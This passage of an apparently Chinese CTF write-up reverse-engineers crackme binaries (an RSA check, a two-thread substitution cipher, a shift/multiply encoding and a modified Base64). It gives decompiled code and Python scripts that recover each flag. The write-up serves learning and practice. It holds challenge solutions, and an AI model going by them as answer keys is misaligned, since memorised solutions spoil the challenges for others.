class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-480h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-470h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">112</span>]; <span class="comment">// [rsp+40h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">1000</span>]; <span class="comment">// [rsp+B0h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+498h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[sign in]&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[input your flag]: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, input);</span><br><span class="line">  sub_96A(input, v9);</span><br><span class="line">  __gmpz_init_set_str(v7, <span class="string">&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v6, v9, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v4, <span class="string">&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v5, <span class="string">&quot;65537&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_powm(v6, v6, v5, v4);</span><br><span class="line">  <span class="keyword">if</span> ( __gmpz_cmp(v6, v7) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TTTTTTTTTTql!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>sub_96A</code>就是转16进制，然后是<code>__gmpz_init_set_str</code>，这个是 GNU 高精度算法库。贴个官网:<a href="https://gmplib.org/manual/">https://gmplib.org/manual/</a></p><p><code>__gmpz_powm</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mpz_powm</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">const</span> <span class="keyword">mpz_t</span> base, <span class="keyword">const</span> <span class="keyword">mpz_t</span> <span class="built_in">exp</span>, <span class="keyword">const</span> <span class="keyword">mpz_t</span> mod)</span> [Function]</span></span><br><span class="line"><span class="function">Set rop to base^<span class="built_in">exp</span> mod mod.</span></span><br></pre></td></tr></table></figure><p>就是计算base的exp次方，然后对mod取模，存到rop。</p><p>这里再看下RSA的加解密情况：</p><blockquote><p>  c  = (m ^ e) mod n</p><p>  其中c为密文，m为明文，e为公钥</p></blockquote><blockquote><p>  m = (c ^ d) mod n</p><p>  d是e关于phi(N)的模反元素</p></blockquote><p>于是乎：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C = ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">m = input</span><br><span class="line">e = 65537</span><br><span class="line">N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br></pre></td></tr></table></figure><p>可以通过在线网站分解pq或者使用yafu也可：</p><blockquote><p>  p = 282164587459512124844245113950593348271</p><p>  q = 366669102002966856876605669837014229419</p></blockquote><p>再之后就是计算私钥d，根据密文，私钥，N计算明文</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">C = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">d = gmpy2.invert(e, (q-<span class="number">1</span>)*(p-<span class="number">1</span>))</span><br><span class="line">m = gmpy2.powmod(C, d, N)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="0x0C-Youngter-drive"><a href="#0x0C-Youngter-drive" class="headerlink" title="0x0C.Youngter-drive"></a>0x0C.Youngter-drive</h1><p>查壳发现是upx，有一个输入，然后是两个线程</p><p>先看下第一个线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">StartAddress_0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_418008 &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_41112C(&amp;input, dword_418008);</span><br><span class="line">      --dword_418008;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub_41112C函数(套了一层)：</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">char</span> *input, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = input[a2];</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    input[a2] = off_418000[<span class="number">0</span>][input[a2] - <span class="number">38</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    input[a2] = off_418000[<span class="number">0</span>][input[a2] - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是小写，当前字符的ascii减96之后到off_418000查；如果是大写，减38</p><p>第二个线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">sub_411B10</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_418008 &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">      --dword_418008;</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各一个字符加密，好家伙幸亏之前看过Windows程序设计，要不然还真可能看不懂.</p><p>再之后的有个与本地字符串的比较：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_411880</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[i] != off_418004[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\nflag&#123;%s&#125;\n\n&quot;</span>, Destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只比较了29位，但是一共有30位，尝试到E正好可以：exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">off_418000 = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">off_418004 = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(off_418004)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(off_418004[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> off_418004[i].isupper():</span><br><span class="line">        a = <span class="built_in">chr</span>(off_418000.find(off_418004[i])+<span class="number">96</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a = <span class="built_in">chr</span>(off_418000.find(off_418004[i])+<span class="number">38</span>)</span><br><span class="line">    <span class="built_in">print</span>(a, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># i += 1</span></span><br><span class="line"><span class="comment">#ThisisthreadofwindowshahaIsES</span></span><br><span class="line"><span class="comment">#y</span></span><br></pre></td></tr></table></figure><h1 id="0x0D-WUSTCTF2020-level1"><a href="#0x0D-WUSTCTF2020-level1" class="headerlink" title="0x0D.[WUSTCTF2020]level1"></a>0x0D.[WUSTCTF2020]level1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (ptr[i] &lt;&lt; i));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (i * ptr[i]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是将output的文件逆一遍，注意上面是从1开始的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">198</span>,</span><br><span class="line">     <span class="number">232</span>,</span><br><span class="line">     <span class="number">816</span>,</span><br><span class="line">     <span class="number">200</span>,</span><br><span class="line">     <span class="number">1536</span>,</span><br><span class="line">     <span class="number">300</span>,</span><br><span class="line">     <span class="number">6144</span>,</span><br><span class="line">     <span class="number">984</span>,</span><br><span class="line">     <span class="number">51200</span>,</span><br><span class="line">     <span class="number">570</span>,</span><br><span class="line">     <span class="number">92160</span>,</span><br><span class="line">     <span class="number">1200</span>,</span><br><span class="line">     <span class="number">565248</span>,</span><br><span class="line">     <span class="number">756</span>,</span><br><span class="line">     <span class="number">1474560</span>,</span><br><span class="line">     <span class="number">800</span>,</span><br><span class="line">     <span class="number">6291456</span>,</span><br><span class="line">     <span class="number">1782</span>,</span><br><span class="line">     <span class="number">65536000</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]//(i+<span class="number">1</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i] &gt;&gt; (i+<span class="number">1</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x0E-ACTF新生赛2020-usualCrypt"><a href="#0x0E-ACTF新生赛2020-usualCrypt" class="headerlink" title="0x0E.[ACTF新生赛2020]usualCrypt"></a>0x0E.[ACTF新生赛2020]usualCrypt</h1><p>ida识别的很多东西都有问题，改了很多</p><p>main：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">12</span>]; <span class="comment">// [esp+8h] [ebp-74h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+16h] [ebp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+18h] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(aGiveMeYourFlag);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  *v5 = <span class="number">0</span>;</span><br><span class="line">  *&amp;v5[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  *&amp;v5[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  sub_401080(input, <span class="built_in">strlen</span>(input), v5);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5[v3] == aZmxhz3tignxlxj[v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt; <span class="built_in">strlen</span>(v5) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(aError);</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v3 - <span class="number">1</span> == <span class="built_in">strlen</span>(aZmxhz3tignxlxj) )</span><br><span class="line">      <span class="comment">//zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</span></span><br><span class="line">    result = <span class="built_in">puts</span>(aAreYouHappyYes);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(aAreYouHappyNo);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的sub_401080:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401080</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+18h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_401000();</span><br><span class="line">  v5 = a2 % <span class="number">3</span>;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a2 - a2 % <span class="number">3</span>;</span><br><span class="line">  v15 = a2 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v5) = a1[v3];</span><br><span class="line">      v3 += <span class="number">3</span>;</span><br><span class="line">      v8 = v4 + <span class="number">1</span>;</span><br><span class="line">      *(a3 + v8 - <span class="number">1</span>) = aAbcdefghijklmn[(v5 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">      *(a3 + v8++) = aAbcdefghijklmn[<span class="number">16</span> * (a1[v3 - <span class="number">3</span>] &amp; <span class="number">3</span>) + ((a1[v3 - <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">      *(a3 + v8++) = aAbcdefghijklmn[<span class="number">4</span> * (a1[v3 - <span class="number">2</span>] &amp; <span class="number">0xF</span>) + ((a1[v3 - <span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>)];</span><br><span class="line">      v5 = a1[v3 - <span class="number">1</span>] &amp; <span class="number">0x3F</span>;</span><br><span class="line">      v4 = v8 + <span class="number">1</span>;</span><br><span class="line">      *(a3 + v4 - <span class="number">1</span>) = aAbcdefghijklmn[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; v7 );</span><br><span class="line">    v5 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v7) = a1[v3];</span><br><span class="line">    v9 = v4 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v9 - <span class="number">1</span>) = aAbcdefghijklmn[(v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v10 - <span class="number">1</span>) = aAbcdefghijklmn[<span class="number">16</span> * (a1[v3] &amp; <span class="number">3</span>)];</span><br><span class="line">    *(a3 + v10) = <span class="number">61</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v13 = v10 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v13) = <span class="number">61</span>;</span><br><span class="line">    v4 = v13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v4 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v11 - <span class="number">1</span>) = aAbcdefghijklmn[(a1[v3] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v12 = &amp;a1[v3 + <span class="number">1</span>];</span><br><span class="line">    LOBYTE(v6) = *v12;</span><br><span class="line">    v10 = v11 + <span class="number">1</span>;</span><br><span class="line">    *(a3 + v10 - <span class="number">1</span>) = aAbcdefghijklmn[<span class="number">16</span> * (a1[v3] &amp; <span class="number">3</span>) + ((v6 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">    *(a3 + v10) = aAbcdefghijklmn[<span class="number">4</span> * (*v12 &amp; <span class="number">0xF</span>)];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">  *(a3 + v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_401030(a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">6</span>; result &lt; <span 